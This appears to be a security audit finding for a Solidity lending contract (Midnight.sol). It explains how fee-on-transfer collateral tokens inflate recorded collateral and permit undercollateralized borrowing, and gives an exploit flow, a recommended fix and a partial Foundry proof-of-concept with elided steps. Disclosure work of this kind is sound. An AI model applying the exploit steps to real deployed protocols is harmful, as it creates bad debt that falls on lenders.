### Title
Fee-on-Transfer Collateral Token Inflates Recorded Collateral, Enabling Undercollateralized Borrowing - (File: src/Midnight.sol)

### Summary

`Midnight.supplyCollateral` records `assets` as the borrower's collateral balance before calling `safeTransferFrom`, with no balance-before/after check to verify the actual amount received. When a fee-on-transfer ERC20 is used as a collateral token, the protocol records more collateral than it holds. Because `isHealthy` computes borrowing capacity from the stored (inflated) collateral value, the borrower can take on debt exceeding the real collateral backing, creating immediate bad debt.

### Finding Description

**Exact code path — `src/Midnight.sol` lines 524–546:**

```solidity
function supplyCollateral(Market memory market, uint256 collateralIndex, uint256 assets, address onBehalf)
    external
{
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    bytes32 id = touchMarket(market);
    address collateralToken = market.collateralParams[collateralIndex].token;

    Position storage _position = position[id][onBehalf];
    uint256 oldCollateral = _position.collateral[collateralIndex];
    _position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + assets); // ← records `assets`
    ...
    SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets); // ← receives `assets - fee`
}
``` [1](#0-0) 

The state write at line 533 unconditionally records `assets`. The `safeTransferFrom` at line 545 is the only transfer, and its return value is not used to reconcile the actual received amount. There is no `balanceBefore`/`balanceAfter` guard anywhere in the function.

**Market creation has no token-type restriction.** `touchMarket` validates only: non-zero token address, sorted order, allowed LLTV tier, and valid maxLif. Fee-on-transfer tokens pass all checks. [2](#0-1) 

**`isHealthy` uses stored collateral, not actual balance:**

```solidity
maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
    .mulDivDown(collateralParam.lltv, WAD);
``` [3](#0-2) 

**Exploit flow:**
1. Attacker deploys a 1%-fee-on-transfer ERC20 (`FeeToken`).
2. Attacker calls `touchMarket` with `FeeToken` as the collateral token — succeeds, no restriction.
3. Attacker calls `supplyCollateral(market, 0, 1000e18, attacker)`:
   - `_position.collateral[0]` ← `1000e18` (recorded)
   - Midnight receives `990e18` (actual, after 1% fee)
4. `isHealthy` computes `maxDebt = 1000e18 * price * lltv / WAD` — inflated by `10e18 * price * lltv / WAD`.
5. Attacker takes a buy offer (lender's side) as seller, borrowing up to the inflated LLTV limit.
6. Attacker's debt exceeds the real collateral value; the position is immediately insolvent.

**Why existing checks fail:** The Certora `supplyCollateralEffects` rule asserts `collateral == collateralBefore + assets` as a formal property, but this is a model-level assumption — `SafeTransferLib.safeTransferFrom` is summarized as `NONDET` in the Healthiness and OnlyAuthorizedCanChange specs, meaning the formal proofs do not model fee-on-transfer behavior. [4](#0-3) 

### Impact Explanation

The recorded collateral exceeds the actual token balance held by Midnight. `isHealthy` grants the borrower a higher debt ceiling than the real collateral supports. The borrower can immediately borrow up to `fee_amount * price * lltv / WAD` in excess of what the collateral can cover, creating bad debt that lenders cannot be made whole from.

### Likelihood Explanation

Market creation is permissionless — any address can call `touchMarket` with any ERC20 as collateral. The attacker controls both the token and the market parameters. The attack is repeatable on every `supplyCollateral` call with a fee-on-transfer token, and the fee gap compounds with each deposit. No privileged action is required.

### Recommendation

Add a balance-before/after check in `supplyCollateral` and credit only the actual received amount:

```solidity
uint256 balanceBefore = IERC20(collateralToken).balanceOf(address(this));
SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets);
uint256 received = IERC20(collateralToken).balanceOf(address(this)) - balanceBefore;
_position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + received);
```

Alternatively, maintain an explicit per-token accounting mapping and reject any transfer where `received < assets`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight, Market, CollateralParams} from "src/Midnight.sol";

contract FeeToken is ERC20 {
    // 1% fee on every transferFrom
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 fee = amount / 100;
        super.transferFrom(from, to, amount - fee); // only transfers 99%
        _burn(from, fee);                           // burns the fee
        return true;
    }
}

contract FeeOnTransferCollateralTest is Test {
    Midnight midnight;
    FeeToken feeToken;
    Market market;

    function setUp() public {
        midnight = new Midnight(...);
        feeToken = new FeeToken();
        // Build market with feeToken as collateral, valid LLTV, oracle at price = ORACLE_PRICE_SCALE
        // ...
        midnight.touchMarket(market);
    }

    function testFeeOnTransferInflatesCollateral() public {
        address borrower = address(this);
        uint256 assets = 1000e18;
        feeToken.mint(borrower, assets);
        feeToken.approve(address(midnight), assets);

        midnight.supplyCollateral(market, 0, assets, borrower);

        bytes32 id = midnight.toId(market);

        // Assertion 1: recorded collateral is inflated
        assertEq(midnight.collateral(id, borrower, 0), 1000e18);

        // Assertion 2: actual balance is only 990e18
        assertEq(feeToken.balanceOf(address(midnight)), 990e18);

        // Assertion 3: position is healthy at inflated collateral (allows borrowing)
        assertTrue(midnight.isHealthy(market, id, borrower));

        // Borrow up to inflated LLTV limit via a sell offer
        // ... take lender's buy offer for units = 1000e18 * lltv / WAD ...

        // Assertion 4: position is immediately insolvent relative to real balance
        // real collateral value = 990e18 * price * lltv / WAD < debt
        // => bad debt exists
    }
}
```

**Expected assertions:**
- `midnight.collateral(id, borrower, 0) == 1000e18` (inflated)
- `feeToken.balanceOf(address(midnight)) == 990e18` (actual)
- After borrowing to the inflated limit: `isHealthy` returns `false` when evaluated against real balance, confirming bad debt

### Citations

**File:** src/Midnight.sol (L531-545)
```text
        Position storage _position = position[id][onBehalf];
        uint256 oldCollateral = _position.collateral[collateralIndex];
        _position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + assets);

        if (oldCollateral == 0 && assets > 0) {
            uint128 newCollateralBitmap = _position.collateralBitmap.setBit(collateralIndex);
            _position.collateralBitmap = newCollateralBitmap;
            require(
                UtilsLib.countBits(newCollateralBitmap) <= MAX_COLLATERALS_PER_BORROWER, TooManyActivatedCollaterals()
            );
        }

        emit EventsLib.SupplyCollateral(msg.sender, id, collateralToken, assets, onBehalf);

        SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets);
```

**File:** src/Midnight.sol (L755-791)
```text
    function touchMarket(Market memory market) public returns (bytes32) {
        bytes32 id = toId(market);
        if (marketState[id].tickSpacing == 0) {
            require(market.maturity <= block.timestamp + 100 * 365 days, MaturityTooFar());
            require(market.collateralParams.length > 0, NoCollateralParams());
            require(market.collateralParams.length <= MAX_COLLATERALS, TooManyCollateralParams());
            address previousCollateralToken;
            for (uint256 i = 0; i < market.collateralParams.length; i++) {
                address collateralToken = market.collateralParams[i].token;
                require(collateralToken > previousCollateralToken, CollateralParamsNotSorted());
                uint256 lltv = market.collateralParams[i].lltv;
                require(isLltvAllowed(lltv), LltvNotAllowed());
                require(
                    market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_LOW)
                        || market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_HIGH),
                    InvalidMaxLif()
                );
                previousCollateralToken = collateralToken;
            }

            MarketState storage _marketState = marketState[id];
            _marketState.tickSpacing = DEFAULT_TICK_SPACING;
            uint16[7] memory _defaultSettlementFeeCbp = defaultSettlementFeeCbp[market.loanToken];
            _marketState.settlementFeeCbp0 = _defaultSettlementFeeCbp[0];
            _marketState.settlementFeeCbp1 = _defaultSettlementFeeCbp[1];
            _marketState.settlementFeeCbp2 = _defaultSettlementFeeCbp[2];
            _marketState.settlementFeeCbp3 = _defaultSettlementFeeCbp[3];
            _marketState.settlementFeeCbp4 = _defaultSettlementFeeCbp[4];
            _marketState.settlementFeeCbp5 = _defaultSettlementFeeCbp[5];
            _marketState.settlementFeeCbp6 = _defaultSettlementFeeCbp[6];
            _marketState.continuousFee = defaultContinuousFee[market.loanToken];
            IdLib.storeInCode(market, INITIAL_CHAIN_ID);

            emit EventsLib.MarketCreated(market, id);
        }
        return id;
    }
```

**File:** src/Midnight.sol (L954-955)
```text
                maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
                    .mulDivDown(collateralParam.lltv, WAD);
```

**File:** certora/specs/OnlyAuthorizedCanChange.spec (L36-37)
```text
    function SafeTransferLib.safeTransferFrom(address, address, address, uint256) internal => NONDET;
    function SafeTransferLib.safeTransfer(address, address, uint256) internal => NONDET;
```
